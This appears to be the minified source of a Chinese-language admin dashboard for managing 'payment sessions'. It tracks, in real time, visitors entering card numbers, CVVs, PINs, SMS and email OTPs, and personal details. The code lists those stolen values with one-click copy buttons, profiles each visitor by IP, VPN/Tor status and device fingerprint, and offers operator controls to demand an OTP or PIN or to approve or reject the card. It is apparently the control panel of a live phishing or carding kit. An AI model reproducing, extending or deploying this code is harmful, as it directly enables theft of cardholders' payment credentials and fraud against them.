import{d as fe,r as T,p as V,cA as ge,a as H,i as ve,o as w,b as x,f as o,w as c,e as s,h as p,B as $,g as v,K as u,t as a,H as L,cx as N,J as B,I as q,af as ye,bT as me,a2 as i,cB as P,al as he,ae as be,cy as we}from"./index-BQSxQzVO.js";import{o as xe,q as ke}from"./session-C35LxKYX.js";import{N as F}from"./Space-Bg__R6dn.js";import{_ as $e,a as Ne}from"./FormItem-Ddsiq6Pr.js";import{N as Se}from"./DatePicker-CIOC2WNQ.js";import{N as ze}from"./DataTable-BTKI-G85.js";import"./get-slot-Bk_rJcZu.js";import"./Pagination-DvoOntIf.js";const Te={class:"min-h-500px flex-col-stretch gap-16px overflow-hidden bg-gray-50 lt-sm:overflow-auto dark:bg-gray-900"},Pe={style:{display:"flex","justify-content":"space-between","align-items":"flex-start",gap:"16px"}},Ae={key:0,class:"detail-content"},Ce={class:"info-section"},Ue={class:"info-grid"},Ie={class:"info-card"},De={class:"info-content"},Me={class:"info-row"},Ve={class:"value"},We={class:"info-row"},Oe={class:"value"},Re={class:"info-row"},je={class:"value"},He={class:"info-row"},Le={class:"value"},Be={class:"info-row"},qe={class:"info-row"},Fe={class:"info-card"},Je={class:"info-content"},Ee={class:"info-row"},Ke={class:"value"},Qe={class:"info-row"},Ge={class:"value"},Xe={class:"info-row"},Ye={class:"value"},Ze={class:"info-row"},et={class:"value user-agent-text"},tt={class:"info-row"},st={class:"info-card"},nt={class:"info-content"},it={class:"info-row"},at={class:"value"},lt={class:"info-row"},ot={class:"value"},rt={class:"info-row"},dt={class:"value"},ct={class:"requests-section"},pt={class:"section-title"},ut={class:"requests-container"},_t={class:"requests-scroll-area"},ft={class:"requests-grid"},gt={class:"request-header"},vt={class:"request-id"},yt={class:"request-header-actions"},mt={class:"request-content"},ht={class:"request-row"},bt={class:"value"},wt={class:"request-row"},xt={class:"value"},kt={class:"request-row"},$t={class:"value"},Nt={class:"request-row"},St={class:"value"},zt={class:"request-row"},Tt={class:"value"},Pt={class:"request-row"},At={class:"value"},Ct={class:"request-row"},Ut={class:"value"},It={class:"request-row"},Dt={class:"value"},Mt={class:"request-row"},Vt={class:"value"},Wt={class:"request-row"},Ot={class:"value"},Rt={class:"operations-section"},jt={class:"section-title"},Ht={class:"operations-grid"},Lt={class:"operation-header"},Bt={class:"operation-type"},qt={class:"operation-content"},Ft={class:"operation-row"},Jt={class:"value"},Et={class:"operation-row"},Kt={class:"value"},Qt={key:0,class:"operation-row"},Gt={class:"value error"},Xt={key:1,class:"py-8 text-center"},Yt=fe({name:"session_manage",__name:"index",setup(Zt){const C=T(!1),h=T([]),f=V({page:1,pageSize:20,total:0,showSizePicker:!0,pageSizes:[10,20,50,100]}),y=V({page:1,size:20,status:"",is_connected:null,start_date:"",end_date:""}),m=V({start_date:null,end_date:null}),U=T(!1),d=T(null),I=T(!1),A={connected:{label:"已连接",type:"success"},filling_card:{label:"填写卡片信息中",type:"warning"},filling_card_holder:{label:"填写持卡人信息中",type:"warning"},filling_card_number:{label:"填写卡号中",type:"warning"},filling_expiry_date:{label:"填写过期日期中",type:"warning"},filling_cvv:{label:"填写CVV中",type:"warning"},filling_personal_info:{label:"填写个人信息中",type:"warning"},filling_phone:{label:"填写电话号码中",type:"warning"},filling_zip_code:{label:"填写邮政编码中",type:"warning"},filling_city:{label:"填写城市中",type:"warning"},filling_street_address:{label:"填写街道地址中",type:"warning"},filling_first_name:{label:"填写名字中",type:"warning"},filling_last_name:{label:"填写姓氏中",type:"warning"},filling_email:{label:"填写邮箱中",type:"warning"},filling_country:{label:"填写国家中",type:"warning"},filling_state:{label:"填写州/省中",type:"warning"},filling_verification:{label:"填写验证码中",type:"warning"},filling_otp:{label:"填写短信验证码中",type:"warning"},filling_email_otp:{label:"填写邮箱验证码中",type:"warning"},filling_pin:{label:"填写PIN码中",type:"warning"},filling_app_verification:{label:"填写APP验证码中",type:"warning"},card_submitted:{label:"已提交卡片",type:"info"},cvv_submitted:{label:"已提交CVV",type:"info"},verification_required:{label:"需要验证",type:"warning"},verification_submitted:{label:"已提交验证",type:"info"},payment_success:{label:"支付成功",type:"success"},payment_failed:{label:"支付失败",type:"error"},card_rejected:{label:"卡片被拒绝",type:"error"},disconnected:{label:"已断开连接",type:"default"}};async function S(t){var e,n;try{await navigator.clipboard.writeText(t),(e=window.$message)==null||e.success("复制成功")}catch(r){console.error("复制失败:",r),(n=window.$message)==null||n.error("复制失败")}}function W(t){const e=JSON.stringify(t.device_fingerprint,null,2);S(e)}function J(t){const e=`#${t.id}
${R(t.status)}
卡号:
${t.card_number||"无"}
持卡人:
${t.card_holder||"无"}
有效期:
${O(t.expiry_date)||"无"}
CVV:
${t.cvv||"无"}
卡类型:
${t.card_type||"无"}
金额:
${t.currency} ${t.amount}
OTP:
${t.otp||"无"}
邮箱OTP:
${t.email_otp||"无"}
PIN:
${t.pin||"无"}
时间:
${N(t.create_time)}`;S(e)}function O(t){return t?t.length===4&&/^\d{4}$/.test(t)?`${t.substring(0,2)} / ${t.substring(2)}`:(t.includes("/"),t):""}async function E(t){var e;try{I.value=!0,U.value=!0,d.value=null;const n=await ke(t.client_id);d.value=n.data}catch(n){console.error("获取详情失败:",n),(e=window.$message)==null||e.error("获取详情失败")}finally{I.value=!1}}function K(t){return{payment_success:"success",payment_failed:"error",card_rejected:"warning"}[t]||"default"}function R(t){return{payment_success:"支付成功",payment_failed:"支付失败",card_rejected:"卡片拒绝"}[t]||t}function Q(t){return{show_initial_wait:"初始等待",show_connecting:"连接页面",show_wait_verification:"等待验证",require_otp:"短信验证",require_email_otp:"邮箱验证",require_app:"App验证",require_pin:"PIN验证",approve_payment:"批准支付",reject_payment:"拒绝支付",reject_card:"拒绝卡片",disconnect_client:"断开客户端"}[t]||t}function G(t){try{if(t.startsWith("file://"))return"Local File";const e=new URL(t);return e.host||e.hostname||"Unknown"}catch{return"Invalid URL"}}function X(t){var r;const e=t.user_agent_parse,n=(r=t.device_fingerprint)==null?void 0:r.device_info;if(e){const{browser_name:g,browser_version:k}=e;return`${g} ${k}`}if(n){const{vendor:g,product:k}=n;return`${g||"Unknown"} ${k||""}`}return"Unknown"}function Y(t){var r;const e=t.user_agent_parse,n=(r=t.device_fingerprint)==null?void 0:r.device_info;if(e){const{browser_os:g}=e;return g||"Unknown"}if(n){const{platform:g}=n;return g||"Unknown"}return"Unknown"}function Z(t){const e=t.ip_info;return e&&e.country?e.country:"Unknown"}function ee(t){var n;const e=(n=t.device_fingerprint)==null?void 0:n.device_info;return e&&e.locale?e.locale:"Unknown"}function te(t){var n;const e=(n=t.device_fingerprint)==null?void 0:n.device_info;return e&&e.timezone?e.timezone:"Unknown"}function se(t){var n;const e=(n=t.ip_info)==null?void 0:n.security;return e?e.is_anonymous||e.is_anonymous_vpn||e.is_hosting_provider||e.is_public_proxy||e.is_tor_exit_node||e.is_residential_proxy||e.is_abuser||e.is_attacker||e.is_bogon||e.is_cloud_provider||e.is_proxy||e.is_relay||e.is_tor||e.is_vpn||e.is_threat:!1}function ne(t){return{is_anonymous:"匿名",is_anonymous_vpn:"匿名VPN",is_hosting_provider:"托管提供商",is_public_proxy:"公共代理",is_tor_exit_node:"Tor出口节点",is_residential_proxy:"住宅代理",is_abuser:"滥用者",is_attacker:"攻击者",is_bogon:"Bogon",is_cloud_provider:"云提供商",is_proxy:"代理",is_relay:"中继",is_tor:"Tor",is_vpn:"VPN",is_threat:"威胁"}[t]||t}function ie(t){S(t)}const ae=[{title:"ID",key:"id",width:80,minWidth:80,fixed:"left"},{title:"客户端ID",key:"client_id",width:320,minWidth:280,render:t=>{const e=t.user_info,n=i("div",{},[i("p",{},`客户端ID: ${t.client_id}`),i("p",{},`用户ID: ${(e==null?void 0:e.id)||"N/A"}`),i("p",{},`UUID: ${(e==null?void 0:e.uuid)||"N/A"}`),i("p",{},`用户代理: ${t.user_agent}`),i("p",{},`首次访问: ${(e==null?void 0:e.first_seen)||"N/A"}`),i("p",{},`最后访问: ${(e==null?void 0:e.last_seen)||"N/A"}`)]);return i("div",{class:"flex items-center gap-1"},[i(P,{trigger:"hover"},{trigger:()=>i(u,{type:"info",size:"small",style:{cursor:"pointer"},onClick:()=>{var r;return S(((r=e==null?void 0:e.id)==null?void 0:r.toString())||"")}},{default:()=>(e==null?void 0:e.id)||"N/A"}),default:()=>n}),i(P,{trigger:"hover"},{trigger:()=>i(u,{type:"success",style:{cursor:"pointer",maxWidth:"300px"},onClick:()=>S((e==null?void 0:e.uuid)||"")},{default:()=>i("span",{style:{display:"block",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}},(e==null?void 0:e.uuid)||"N/A")}),default:()=>n})])}},{title:"IP地址",key:"ip_address",width:280,minWidth:250,render:t=>{const e=t.ip_info,n=se(t),r=e==null?void 0:e.security,g=i("div",{},[i("p",{},`IP地址: ${t.ip_address}`),...e?[i("p",{},`国家: ${e.country||"N/A"}`),i("p",{},`国家代码: ${e.country_code||"N/A"}`),i("p",{},`地区: ${e.region||"N/A"}`),i("p",{},`地区代码: ${e.region_code||"N/A"}`),i("p",{},`城市: ${e.city||"N/A"}`),i("p",{},`邮编: ${e.zip_code||"N/A"}`),i("p",{},`纬度: ${e.latitude||"N/A"}`),i("p",{},`经度: ${e.longitude||"N/A"}`),i("p",{},`时区: ${e.timezone||"N/A"}`),i("p",{},`ISP: ${e.isp||"N/A"}`),i("p",{},`组织: ${e.organization||"N/A"}`),i("p",{},`AS号码: ${e.as_number||"N/A"}`),i("p",{},`提供商: ${e.provider||"N/A"}`)]:[i("p",{},"无详细信息")]]),k=i("div",{style:{maxWidth:"400px"}},[i("p",{style:{fontWeight:"bold",marginBottom:"8px"}},"风控信息:"),...r?Object.entries(r).map(([_,b])=>i("div",{style:{display:"inline-block",margin:"2px 4px",padding:"2px 6px",borderRadius:"4px",fontSize:"12px",backgroundColor:b?"#fee":"#efe",color:b?"#c41e3a":"#52c41a"}},`${ne(_)}: ${b?"是":"否"}`)):[i("p",{},"无风控信息")]]),M=Z(t);return i("div",{class:"flex items-center gap-1"},[i(P,{trigger:"hover"},{trigger:()=>i(u,{type:"warning",style:{cursor:"pointer"},onClick:()=>S(t.ip_address)},{default:()=>t.ip_address}),default:()=>g}),i(u,{type:"default",size:"small"},{default:()=>M}),i(P,{trigger:"hover"},{trigger:()=>i(u,{type:n?"error":"success",size:"small"},{default:()=>"风控"}),default:()=>k})])}},{title:"页面",key:"page_url",width:140,minWidth:120,render:t=>{const e=G(t.page_url);return i(P,{trigger:"hover"},{trigger:()=>i(u,{type:"success",size:"small",style:{cursor:"pointer"},onClick:()=>ie(t.page_url)},{default:()=>e}),default:()=>`完整URL: ${t.page_url}`})}},{title:"平台",key:"platform",width:220,minWidth:180,render:t=>{const e=X(t),n=Y(t);return i("div",{class:"flex items-center gap-1"},[i(u,{type:"info",size:"small"},{default:()=>e}),i(u,{type:"primary",size:"small"},{default:()=>n})])}},{title:"用户风控",key:"risk_control",width:180,minWidth:150,render:t=>{const e=ee(t),n=te(t);return i("div",{class:"flex items-center gap-1"},[i(u,{type:"warning",size:"small"},{default:()=>e}),i(u,{type:"error",size:"small"},{default:()=>n})])}},{title:"状态",key:"status",width:160,minWidth:140,render:t=>{const e=A[t.status]||{label:t.status,type:"default"};return i(u,{type:e.type},{default:()=>e.label})}},{title:"连接状态",key:"is_connected",width:110,minWidth:100,render:t=>i(u,{type:t.is_connected?"success":"default",size:"small"},{default:()=>t.is_connected?"在线":"离线"})},{title:"最后活动",key:"last_activity",width:180,minWidth:160,render:t=>N(t.last_activity)},{title:"操作",key:"actions",width:220,minWidth:200,fixed:"right",render:t=>i("div",{class:"flex gap-2"},[i($,{size:"small",type:"info",ghost:!0,onClick:()=>W(t)},{default:()=>"复制指纹"}),i($,{size:"small",type:"primary",ghost:!0,onClick:()=>E(t)},{default:()=>"查看详细"})])}];ge({onMessage:t=>{le(t.data)}});function le(t){if(!t||!t.type)return;const{type:e,client_id:n,session_info:r}=t;["client_event","client_connected","client_disconnected","user_start_fill_card","user_personal_info_change","user_start_fill_verification","verification_submit"].includes(e)&&oe(n,r)}function oe(t,e){if(!t||!e)return;const n=h.value.findIndex(r=>r.client_id===t);n!==-1&&(h.value[n]={...h.value[n],status:e.status||h.value[n].status,is_connected:e.status!=="disconnected",is_online:e.status!=="disconnected",last_activity:new Date().toISOString()})}async function z(){var t;try{C.value=!0;const e={...y,page:f.page,size:f.pageSize,start_date:m.start_date?new Date(m.start_date).toISOString():void 0,end_date:m.end_date?new Date(m.end_date).toISOString():void 0},{data:n}=await xe(e);h.value=(n==null?void 0:n.sessions)||[],f.total=(n==null?void 0:n.total)||0,console.log("API返回的total:",n==null?void 0:n.total),console.log("设置的pagination.total:",f.total)}catch(e){console.error("获取支付会话列表失败:",e),(t=window.$message)==null||t.error("获取支付会话列表失败")}finally{C.value=!1}}function re(){f.page=1,y.page=1,z()}function de(){Object.assign(y,{page:1,size:20,status:"",is_connected:void 0}),Object.assign(m,{start_date:null,end_date:null}),f.page=1,z()}function ce(t){f.page=t,y.page=t,z()}function pe(t){f.pageSize=t,f.page=1,y.size=t,y.page=1,z()}function ue(){z()}const D=H(()=>{const t=h.value.length,e=h.value.filter(r=>r.is_connected).length,n=t-e;return{total:t,online:e,offline:n}}),_e=H(()=>{const t=window.innerHeight;return Math.max(300,t-120-60-60-80)});return ve(()=>{z()}),(t,e)=>{const n=he,r=$e,g=Se,k=Ne,M=ze;return w(),x("div",Te,[o(p(L),{title:"",class:"card-wrapper",size:"small"},{default:c(()=>[s("div",Pe,[o(k,{inline:"",model:y,"label-placement":"left",style:{flex:"1"}},{default:c(()=>[o(r,{label:"状态"},{default:c(()=>[o(n,{value:y.status,"onUpdate:value":e[0]||(e[0]=_=>y.status=_),placeholder:"选择状态",clearable:"",style:{width:"160px"},options:Object.entries(A).map(([_,b])=>({label:b.label,value:_}))},null,8,["value","options"])]),_:1}),o(r,{label:"连接状态"},{default:c(()=>[o(n,{value:y.is_connected,"onUpdate:value":e[1]||(e[1]=_=>y.is_connected=_),placeholder:"选择连接状态",clearable:"",style:{width:"120px"},options:[{label:"在线",value:"true"},{label:"离线",value:"false"}]},null,8,["value"])]),_:1}),o(r,{label:"开始时间"},{default:c(()=>[o(g,{value:m.start_date,"onUpdate:value":e[2]||(e[2]=_=>m.start_date=_),type:"datetime",placeholder:"选择开始时间",clearable:"",style:{width:"180px"}},null,8,["value"])]),_:1}),o(r,{label:"结束时间"},{default:c(()=>[o(g,{value:m.end_date,"onUpdate:value":e[3]||(e[3]=_=>m.end_date=_),type:"datetime",placeholder:"选择结束时间",clearable:"",style:{width:"180px"}},null,8,["value"])]),_:1}),o(r,null,{default:c(()=>[o(p(F),null,{default:c(()=>[o(p($),{type:"primary",onClick:re},{default:c(()=>e[6]||(e[6]=[v("搜索")])),_:1}),o(p($),{onClick:de},{default:c(()=>e[7]||(e[7]=[v("重置")])),_:1}),o(p($),{onClick:ue},{default:c(()=>e[8]||(e[8]=[v("刷新")])),_:1})]),_:1})]),_:1})]),_:1},8,["model"]),o(p(F),null,{default:c(()=>[o(p(u),{type:"info"},{default:c(()=>[v("总计: "+a(D.value.total),1)]),_:1}),o(p(u),{type:"success"},{default:c(()=>[v("在线: "+a(D.value.online),1)]),_:1}),o(p(u),{type:"default"},{default:c(()=>[v("离线: "+a(D.value.offline),1)]),_:1})]),_:1})])]),_:1}),o(p(L),{class:"flex-1-hidden card-wrapper table-card"},{default:c(()=>[o(M,{columns:ae,data:h.value,loading:C.value,pagination:{page:f.page,pageSize:f.pageSize,itemCount:f.total,showSizePicker:!0,showQuickJumper:!0,pageSizes:[10,20,50,100],prefix:()=>`共 ${f.total} 条记录`,"onUpdate:page":ce,"onUpdate:pageSize":pe},"scroll-x":2e3,"max-height":_e.value,size:"small",remote:"","flex-height":""},null,8,["data","loading","pagination","max-height"])]),_:1}),o(p(me),{show:U.value,"onUpdate:show":e[5]||(e[5]=_=>U.value=_),preset:"card",title:"支付会话详情",class:"detail-modal",style:{width:"70%"},"mask-closable":!1},{default:c(()=>{var _,b,j;return[d.value&&d.value.session&&!I.value?(w(),x("div",Ae,[s("div",Ce,[e[27]||(e[27]=s("h4",{class:"section-title"},"基本信息",-1)),s("div",Ue,[s("div",Ie,[e[15]||(e[15]=s("h5",{class:"info-title"},"会话信息",-1)),s("div",De,[s("div",Me,[e[9]||(e[9]=s("span",{class:"label"},"ID:",-1)),s("span",Ve,a(d.value.session.id),1)]),s("div",We,[e[10]||(e[10]=s("span",{class:"label"},"客户端ID:",-1)),s("span",Oe,a(d.value.session.client_id),1)]),s("div",Re,[e[11]||(e[11]=s("span",{class:"label"},"会话ID:",-1)),s("span",je,a(d.value.session.session_id),1)]),s("div",He,[e[12]||(e[12]=s("span",{class:"label"},"IP地址:",-1)),s("span",Le,a(d.value.session.ip_address),1)]),s("div",Be,[e[13]||(e[13]=s("span",{class:"label"},"状态:",-1)),o(p(u),{type:((_=A[d.value.session.status])==null?void 0:_.type)||"default"},{default:c(()=>{var l;return[v(a(((l=A[d.value.session.status])==null?void 0:l.label)||d.value.session.status),1)]}),_:1},8,["type"])]),s("div",qe,[e[14]||(e[14]=s("span",{class:"label"},"连接状态:",-1)),o(p(u),{type:d.value.session.is_connected?"success":"default"},{default:c(()=>[v(a(d.value.session.is_connected?"在线":"离线"),1)]),_:1},8,["type"])])])]),s("div",Fe,[e[22]||(e[22]=s("h5",{class:"info-title"},"页面信息",-1)),s("div",Je,[s("div",Ee,[e[16]||(e[16]=s("span",{class:"label"},"页面URL:",-1)),s("span",Ke,a(d.value.session.page_url),1)]),s("div",Qe,[e[17]||(e[17]=s("span",{class:"label"},"页面标题:",-1)),s("span",Ge,a(d.value.session.page_title),1)]),s("div",Xe,[e[18]||(e[18]=s("span",{class:"label"},"来源页面:",-1)),s("span",Ye,a(d.value.session.referrer||"无"),1)]),s("div",Ze,[e[19]||(e[19]=s("span",{class:"label"},"用户代理:",-1)),s("span",et,a(d.value.session.user_agent),1)]),s("div",tt,[e[21]||(e[21]=s("span",{class:"label"},"设备指纹:",-1)),o(p($),{size:"small",type:"primary",ghost:"",onClick:e[4]||(e[4]=l=>W(d.value.session))},{default:c(()=>e[20]||(e[20]=[v(" 复制指纹数据 ")])),_:1})])])]),s("div",st,[e[26]||(e[26]=s("h5",{class:"info-title"},"时间信息",-1)),s("div",nt,[s("div",it,[e[23]||(e[23]=s("span",{class:"label"},"最后活动:",-1)),s("span",at,a(p(N)(d.value.session.last_activity)),1)]),s("div",lt,[e[24]||(e[24]=s("span",{class:"label"},"创建时间:",-1)),s("span",ot,a(p(N)(d.value.session.create_time)),1)]),s("div",rt,[e[25]||(e[25]=s("span",{class:"label"},"更新时间:",-1)),s("span",dt,a(p(N)(d.value.session.update_time)),1)])])])])]),s("div",ct,[s("h4",pt,"支付请求记录 ("+a(((b=d.value.requests)==null?void 0:b.length)||0)+" 条)",1),s("div",ut,[s("div",_t,[s("div",ft,[(w(!0),x(B,null,q(d.value.requests||[],l=>(w(),x("div",{key:l.id,class:"request-card"},[s("div",gt,[s("span",vt,"#"+a(l.id),1),s("div",yt,[o(p(u),{type:K(l.status),size:"small"},{default:c(()=>[v(a(R(l.status)),1)]),_:2},1032,["type"]),o(p($),{size:"tiny",type:"primary",ghost:"",style:{"margin-left":"4px"},onClick:es=>J(l)},{default:c(()=>e[28]||(e[28]=[v(" 复制 ")])),_:2},1032,["onClick"])])]),s("div",mt,[s("div",ht,[e[29]||(e[29]=s("span",{class:"label"},"卡号:",-1)),s("span",bt,a(l.card_number||"无"),1)]),s("div",wt,[e[30]||(e[30]=s("span",{class:"label"},"持卡人:",-1)),s("span",xt,a(l.card_holder||"无"),1)]),s("div",kt,[e[31]||(e[31]=s("span",{class:"label"},"有效期:",-1)),s("span",$t,a(O(l.expiry_date)||"无"),1)]),s("div",Nt,[e[32]||(e[32]=s("span",{class:"label"},"CVV:",-1)),s("span",St,a(l.cvv||"无"),1)]),s("div",zt,[e[33]||(e[33]=s("span",{class:"label"},"卡类型:",-1)),s("span",Tt,a(l.card_type||"无"),1)]),s("div",Pt,[e[34]||(e[34]=s("span",{class:"label"},"金额:",-1)),s("span",At,a(l.currency)+" "+a(l.amount),1)]),s("div",Ct,[e[35]||(e[35]=s("span",{class:"label"},"OTP:",-1)),s("span",Ut,a(l.otp||"无"),1)]),s("div",It,[e[36]||(e[36]=s("span",{class:"label"},"邮箱OTP:",-1)),s("span",Dt,a(l.email_otp||"无"),1)]),s("div",Mt,[e[37]||(e[37]=s("span",{class:"label"},"PIN:",-1)),s("span",Vt,a(l.pin||"无"),1)]),s("div",Wt,[e[38]||(e[38]=s("span",{class:"label"},"时间:",-1)),s("span",Ot,a(p(N)(l.create_time)),1)])])]))),128))])])])]),s("div",Rt,[s("h4",jt,"管理员操作记录 ("+a(((j=d.value.admin_operations)==null?void 0:j.length)||0)+" 条)",1),s("div",Ht,[(w(!0),x(B,null,q(d.value.admin_operations||[],l=>(w(),x("div",{key:l.id,class:"operation-card"},[s("div",Lt,[s("span",Bt,a(Q(l.operation_type)),1),o(p(u),{type:l.success?"success":"error",size:"small"},{default:c(()=>[v(a(l.success?"成功":"失败"),1)]),_:2},1032,["type"])]),s("div",qt,[s("div",Ft,[e[39]||(e[39]=s("span",{class:"label"},"管理员:",-1)),s("span",Jt,a(l.admin_user),1)]),s("div",Et,[e[40]||(e[40]=s("span",{class:"label"},"时间:",-1)),s("span",Kt,a(p(N)(l.create_time)),1)]),l.error_message?(w(),x("div",Qt,[e[41]||(e[41]=s("span",{class:"label"},"错误:",-1)),s("span",Gt,a(l.error_message),1)])):be("",!0)])]))),128))])])])):(w(),x("div",Xt,[o(p(ye),{size:"large"})]))]}),_:1},8,["show"])])}}}),ds=we(Yt,[["__scopeId","data-v-aae10179"]]);export{ds as default};
